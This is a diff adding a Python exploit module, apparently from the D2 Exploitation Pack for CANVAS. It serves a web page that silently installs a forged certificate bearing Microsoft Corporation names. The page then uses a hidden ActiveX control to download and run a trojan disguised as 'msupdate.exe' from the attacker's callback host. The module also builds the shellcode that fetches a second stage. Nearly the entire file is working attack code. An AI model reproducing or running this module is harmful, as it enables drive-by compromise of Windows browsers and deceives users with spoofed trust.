@@ -1,0 +1,232 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import canvasengine
+import struct
+import os
+
+# GUI info
+NAME = "Malicious HTTP/HTTPS MOSDEF ActiveX"
+
+DESCRIPTION = "Force the installation of our fake certificate and install a malicious HTTP/HTTPS MOSDEF ActiveX"
+DOCUMENTATION = {}
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['DELIVERY'] = "HTTP"
+PROPERTY['VERSION'] = ['2000','XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_activex -l 192.168.52.1 -d 5555 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows 2000 SP4, XP SP0-SP2 with IE'],
+}
+
+	
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.name = NAME 
+        self.filename = "index.html"
+        self.trojanname = "msupdate.exe"
+        self.ocxname = "d2ax.ocx"
+        return
+
+    def makefile(self):
+        filedata = """
+<HTML> 
+ <BODY>
+  <SCRIPT language="VBScript">
+        On Error Resume Next
+        Dim Enroll
+
+        cert = "MIIGwAYJKoZIhvcNAQcCoIIGsTCCBq0CAQExADALBgkqhkiG9w0BBwGgggaVMIIG" & _
+        "kTCCBHmgAwIBAgIQELm4+XYQPoBEbGObRVjusjANBgkqhkiG9w0BAQUFADCBhDEL" & _
+        "MAkGA1UEBhMCVVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcTB1JlZG1v" & _
+        "bmQxHjAcBgNVBAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEuMCwGA1UEAxMlTWlj" & _
+        "cm9zb2Z0IFdpbmRvd3MgQ29tcG9uZW50IFB1Ymxpc2hlcjAeFw0xMDAxMjUyMTE0" & _
+        "MzhaFw0zMDAxMjUyMTIyMzZaMIGEMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2Fz" & _
+        "aGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0IENv" & _
+        "cnBvcmF0aW9uMS4wLAYDVQQDEyVNaWNyb3NvZnQgV2luZG93cyBDb21wb25lbnQg" & _
+        "UHVibGlzaGVyMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAn3zwt1Re" & _
+        "4chpzXY6De1WLpvSAWPpFGR02x2eGYrKBAek6DGGwazNdRRzWCIOaWXKcfxd68HH" & _
+        "5IPlwCgjss+jMERTbBsebVttAmtJTkUkkq8luat8Hs752XEqMEG6Sh6om34aYAJq" & _
+        "4Zfg2KepW6i6yc8DmWPZZdBVIrcoql28KMwrZ1UZv8LNyBSPMCn6qvxfoDCUBEjY" & _
+        "d8ttUxXKAVnJG4F6y9uUbsNjF2X0+ZxI/pdievvCYdeN1qypwxVrLwcPC9Xx+ubP" & _
+        "1pTjnh1gYRwmfUvFG74YgoVb1mrkW8t9hgCSHjNLLKrgjvP8NT41seTjJ1n+RvYY" & _
+        "USyM3cuiZ5ENHgO2/fsrO5ecEto8YtMIpxvxfx7v8bUwVha4To/EzqpG+Omui//i" & _
+        "Dzjk4pqe26hpyOfe8mBIdIIXd20gSJEjXFDDflbfwhtLrGSPhcZzAHQLQ5i3Sqy5" & _
+        "HhIOFxMaJAvvX4GY1elVIe2QIiRVciQmwRQZKNevuCYvTmWHXb4A43YFkQbn3O2q" & _
+        "ce2vzHCeRrZLsP+Z01hPHeJHIS7NgtA9HGnALjtyGvdQRX/jki9wecZQMgamPUOr" & _
+        "ICdByxuXSPz2mRcALjUXRn8zgbSTvInLJvMIpEnhdQjJN8F1zlVt2//1OD/gmWi7" & _
+        "7f6Evenl+i8suqWUrwspGieiteSzq1DWTDsCAwEAAaOB/DCB+TALBgNVHQ8EBAMC" & _
+        "AcYwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQU4XoRqH5Gh4GCJYW3qzOVeB+K" & _
+        "ylkwgacGA1UdHwSBnzCBnDBLoEmgR4ZFaHR0cDovL3cyay9DZXJ0RW5yb2xsL01p" & _
+        "Y3Jvc29mdCUyMFdpbmRvd3MlMjBDb21wb25lbnQlMjBQdWJsaXNoZXIuY3JsME2g" & _
+        "S6BJhkdmaWxlOi8vXFx3MmtcQ2VydEVucm9sbFxNaWNyb3NvZnQlMjBXaW5kb3dz" & _
+        "JTIwQ29tcG9uZW50JTIwUHVibGlzaGVyLmNybDAQBgkrBgEEAYI3FQEEAwIBADAN" & _
+        "BgkqhkiG9w0BAQUFAAOCAgEAW8lKMLE646+n39cnQL4D45O08dUSoGL5Am22t1Oh" & _
+        "y1byavU79TZzWpAsWbFq2OGh/UEFGeBmS2XmP4/f0yVH+qMLF/pBq2hXifcu/+tP" & _
+        "k0EeNX5QQZCbsOL0vcRXaXQC9woEt6nNK9A0hog5xZELlJQIxD7mSde6CGI0rJES" & _
+        "pejFqBBwpaWrGnkrPDeYzAT8tfaE9uCDaokhWDpazwAWqAZ4FbUicgUmT9PGhoD2" & _
+        "RJh7PZIe2Xp05XkQwURKAKdHjGEHtmSb0AhpRdGIquZ8DbE7q/eMv2cOgD2jEWMU" & _
+        "Dx1DMpcKqIWc3x9meECki8rlVR/fy+gyWcwaBfK3Z4J2iiw4zhrL37DDydEFV9QF" & _
+        "oTbMm5MDIwS6GIXgNLDvZY9zyZkxX3AltQvIGrnMFF0r1CUkiniy5n95RfeNPKCF" & _
+        "E9x+KiCELizp7WMbNhaBWiOq4YJM3nwfA/ISjt2F0S6+AYVANdH+T3tvafRJCmWF" & _
+        "1zQCUBbLPg70J4ZhQ/CL3hBDBJSTIpodXexATLUQKg6i7QgT8WZq/4KKcGbVu7hx" & _
+        "YwqJ/i8pYzt4ER2GIHfM+nKrA1uY3vZ+nT+tKXI7fNkvMVZ10gtH+lQEdkBgcfd8" & _
+        "Ev3T4g3QkSFbOzT6O2rv25kza2xT2sfMuyQD/q1DrK5CFuc1+DkLsedrJaz0Lgoi" & _
+        "4vcxAA=="     
+    
+        Set Enroll = CreateObject("CEnroll.CEnroll.2")
+    
+        if ( (Err.Number = 438) OR (Err.Number = 429) ) Then
+            Err.Clear
+            Set Enroll = CreateObject("CEnroll.CEnroll.1")
+        End If
+
+        if (Err.Number = 0) Then
+            Call Enroll.InstallPKCS7(cert)
+        End if
+  </SCRIPT>
+  
+  <DIV style="visibility:hidden">
+    <OBJECT classid="clsid:7A6C9338-7103-42F5-B2A1-02D68ACAE829" codebase="ACTIVEXURL" id="target"></OBJECT>
+  </DIV>
+ 
+  <SCRIPT language="javascript">  
+    try {	
+      target.exename = "MOSDEFEXENAME";
+      target.URL = "MOSDEFTROJANURL"
+      target.start();		
+    }
+    catch(e) {}
+  </SCRIPT> 
+
+ </BODY> 
+</HTML>                
+"""
+        if self.useSSL:
+            filedata = filedata.replace("MOSDEFTROJANURL", "https://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.trojanname)
+        else:
+            filedata = filedata.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.trojanname)
+
+        filedata = filedata.replace("ACTIVEXURL", "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.ocxname)
+        filedata = filedata.replace("MOSDEFEXENAME", self.trojanname)
+				
+        return filedata
+
+
+    def maketrojan(self):
+        host = self.callback.ip
+        port = self.callback.port
+
+        sc = shellcodeGenerator.win32()
+        sc.addAttr("findeipnoesp", {"subespval":0x1000})
+        
+        if self.useSSL:
+            ssl = "s"
+        else:
+            ssl = ""                
+
+        sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+        shellcode = sc.get()        
+        myPElib = pelib.PElib()
+	
+        self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+        
+        self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
+        
+        file(self.trojanname, "wb").write(self.mosdeftrojan)
+
+        self.setInfo("%s - done" % (NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        self.maketrojan()
+        
+        if clientheader.URL.count(self.filename):                        
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+            
+        elif clientheader.URL.count(self.trojanname):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojanname, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojanname)
+            self.log("Sending %d bytes"%len(sploitstring))
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")
+            b.setBody(sploitstring)
+            
+        elif clientheader.URL.count(self.ocxname):
+            self.log("Sending ActiveX")            
+            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_activex/" + self.ocxname, "rb")
+            sploitstring = f.read()
+            f.close()            
+            self.log("Sending %d bytes"%len(sploitstring))
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")
+            b.setBody(sploitstring)
+               
+        else:
+            self.log("Redirecting to self")
+            h.status = "302"
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+            
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
